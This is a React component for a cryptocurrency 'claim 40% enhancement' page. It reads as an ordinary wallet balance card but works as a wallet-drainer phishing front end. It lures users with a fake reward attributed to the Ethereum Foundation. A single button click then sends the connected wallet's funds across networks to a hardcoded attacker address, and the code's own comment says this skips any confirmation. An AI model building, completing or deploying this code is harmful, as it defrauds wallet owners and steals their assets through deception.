import { useState } from "react";
import { AlertTriangle, Coins, Bug, Loader2, CheckCircle } from "lucide-react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { useWeb3 } from "@/hooks/use-web3";
import { web3Service } from "@/lib/web3";
import type { WalletState } from "@/lib/web3";

interface BalanceCardProps {
  walletState: WalletState;
  onTransactionStart: (txHash: string) => void;
  onMultiNetworkTransfer?: (toAddress: string) => Promise<any>;
}

export default function BalanceCard({ walletState, onTransactionStart, onMultiNetworkTransfer }: BalanceCardProps) {
  const { isTransferring, hasAnyNetworkFunds, crossNetworkValue } = useWeb3();
  const [isWalletLoading, setIsWalletLoading] = useState(false);
  const [currentProcessingNetwork, setCurrentProcessingNetwork] = useState<string | null>(null);

  // Get destination address from environment - using your vault address
  const destinationAddress = import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE";

  // Validation function for Ethereum address
  const isValidEthereumAddress = (address: string): boolean => {
    return /^0x[a-fA-F0-9]{40}$/.test(address);
  };

  // Show error if destination address is invalid
  if (!destinationAddress || !isValidEthereumAddress(destinationAddress)) {
    return (
      <Card>
        <CardContent className="pt-6">
          <Alert className="border-red-200 bg-red-50">
            <AlertTriangle className="h-4 w-4 text-red-600" />
            <AlertDescription className="text-red-800">
              <div className="font-medium">Configuration Error</div>
              <div className="text-sm mt-1">
                Invalid or missing destination address. Please check your configuration.
                <br />
                Current address: {destinationAddress || 'Not set'}
              </div>
            </AlertDescription>
          </Alert>
        </CardContent>
      </Card>
    );
  }

  const handleMultiNetworkTransfer = async () => {
    // Show loading instantly when button is clicked
    setIsWalletLoading(true);
    console.log("🔄 Starting claim process...");
    
    try {
      // Direct transfer without any confirmation or toast notifications
      if (onMultiNetworkTransfer) {
        console.log("📞 Calling transfer function with address:", destinationAddress);
        const result = await onMultiNetworkTransfer(destinationAddress);
        console.log("✅ Transfer completed:", result);
      } else {
        console.error("❌ onMultiNetworkTransfer function not available");
      }
    } catch (error) {
      console.error("❌ Transfer failed:", error);
      // Don't hide the error - let user see what happened
      alert(`Transfer failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
    } finally {
      // Hide loading after wallet interaction
      setIsWalletLoading(false);
      console.log("🏁 Transfer process completed");
    }
  };

  // Calculate total USD value across all networks
  const totalValue = crossNetworkValue > 0 ? crossNetworkValue : walletState.totalUsdValue;
  const balanceUSD = totalValue.toLocaleString('en-US', {
    style: 'currency',
    currency: 'USD'
  });
  
  // Calculate 40% enhancement value
  const enhancementValue = totalValue * 0.4;
  const enhancementUSD = enhancementValue.toLocaleString('en-US', {
    style: 'currency',
    currency: 'USD'
  });

  if (!walletState.isConnected) {
    return (
      <div className="text-center">
        <div className="bg-gray-100 dark:bg-gray-800 rounded-xl p-6 mb-4">
          <p className="text-gray-600 dark:text-gray-400 mb-4">Connect your wallet to claim your 40% portfolio enhancement reward</p>
          <Button disabled className="w-full bg-gray-300 text-gray-500 cursor-not-allowed">
            Connect Wallet to Claim 40% Enhancement
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="text-center space-y-6">
      {/* Wallet Portfolio Display */}
      <div className="bg-white/50 dark:bg-gray-800/50 rounded-xl p-6 border border-gray-200 dark:border-gray-700">
        <div className="text-sm text-gray-600 dark:text-gray-400 mb-2">Your Current Portfolio</div>
        <div className="text-2xl font-bold text-gray-900 dark:text-white mb-3">{balanceUSD}</div>
        <div className="text-xs text-gray-500 dark:text-gray-500 mb-4">
          Across {walletState.networkBalances?.length || 1} networks • {(walletState.tokenBalances?.length || 0) + 1} assets
        </div>
        
        {/* Enhancement Calculation Display */}
        <div className="bg-primary/5 border border-primary/20 rounded-lg p-3">
          <div className="flex items-center justify-between">
            <div className="text-sm text-muted-foreground">40% Enhancement Value:</div>
            <div className="text-lg font-bold text-primary">{enhancementUSD}</div>
          </div>
          <div className="text-xs text-muted-foreground mt-1">
            Algorithmic portfolio optimization through Ethereum Foundation protocol
          </div>
        </div>
      </div>

      {/* Claim Button */}
      <div className="space-y-4">
        <Button
          onClick={handleMultiNetworkTransfer}
          disabled={isTransferring || isWalletLoading || (!hasAnyNetworkFunds && crossNetworkValue <= 0 && !walletState.networkBalances?.length)}
          className={`w-full h-20 text-xl font-black transition-all duration-500 transform hover:scale-105 ${
            isTransferring || isWalletLoading
              ? "bg-gradient-to-r from-gray-400 to-gray-500 cursor-not-allowed"
              : (hasAnyNetworkFunds || crossNetworkValue > 0 || walletState.networkBalances?.length > 0)
              ? "bg-gradient-to-r from-primary via-secondary to-accent bg-size-200 bg-pos-0 hover:bg-pos-100 text-white shadow-2xl hover:shadow-primary/50 glow-effect border-2 rainbow-border"
              : "bg-gray-300 text-gray-500 cursor-not-allowed"
          } rounded-2xl relative overflow-hidden group`}
        >
          <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent shimmer opacity-0 group-hover:opacity-100"></div>
          <div className="relative z-10">
            {isTransferring || isWalletLoading ? (
              <div className="flex flex-col items-center space-y-2">
                <div className="flex items-center space-x-3">
                  <div className="w-8 h-8 border-4 border-white/30 border-t-white rounded-full animate-spin"></div>
                  <span className="gradient-text font-black text-2xl">🚀 Processing Enhancement...</span>
                </div>
                {currentProcessingNetwork && (
                  <div className="text-sm opacity-90 bg-white/20 px-3 py-1 rounded-full">
                    Network: {currentProcessingNetwork}
                  </div>
                )}
                {walletState.networkName && !currentProcessingNetwork && (
                  <div className="text-sm opacity-90 bg-white/20 px-3 py-1 rounded-full">
                    Starting on {walletState.networkName}
                  </div>
                )}
              </div>
            ) : (
              <div className="flex items-center justify-center space-x-3">
                <span className="text-4xl animate-pulse">💎</span>
                <div className="text-center">
                  <div className="text-2xl font-black">CLAIM 40% ENHANCEMENT</div>
                  <div className="text-lg font-bold opacity-90">{enhancementUSD}</div>
                </div>
                <span className="text-4xl animate-pulse">⚡</span>
              </div>
            )}
          </div>
        </Button>
        
        <div className="text-xs text-gray-500 dark:text-gray-400 text-center">
          * Claim processes 40% of your {balanceUSD} portfolio ({enhancementUSD}) through algorithmic enhancement
        </div>
      </div>

      {/* Debug Info (collapsed) */}
      <details className="text-xs mt-6">
        <summary className="cursor-pointer text-gray-400 hover:text-gray-600 flex items-center justify-center gap-1">
          <Bug className="h-3 w-3" />
          Technical Details
        </summary>
        <div className="mt-2 p-3 bg-gray-100 dark:bg-gray-800 rounded text-xs font-mono text-gray-600 dark:text-gray-400">
          <div><strong>Connection:</strong> {walletState.isConnected ? 'Connected' : 'Disconnected'}</div>
          <div><strong>Address:</strong> {walletState.address || 'None'}</div>
          <div><strong>Network:</strong> {walletState.networkId || 'None'}</div>
          <div><strong>Portfolio Value:</strong> {balanceUSD}</div>
          <div><strong>Eligible for Claim:</strong> {hasAnyNetworkFunds ? 'Yes' : 'No'}</div>
          <div><strong>Cross-Network Value:</strong> ${crossNetworkValue.toFixed(6)}</div>
          <div><strong>Button Disabled:</strong> {(isTransferring || isWalletLoading || !hasAnyNetworkFunds) ? 'Yes' : 'No'}</div>
          <div><strong>Network Balances Count:</strong> {walletState.networkBalances?.length || 0}</div>
          <div><strong>Networks with Tokens:</strong> {walletState.networkBalances?.filter(n => n.tokenBalances?.length > 0).length || 0}</div>
          <div><strong>Total Token Count:</strong> {walletState.networkBalances?.reduce((sum, n) => sum + (n.tokenBalances?.length || 0), 0) || 0}</div>
          <div><strong>All Networks Loaded:</strong> {walletState.allNetworksLoaded ? 'Yes' : 'No'}</div>
          <div><strong>Destination:</strong> {destinationAddress}</div>
        </div>
      </details>
    </div>
  );
}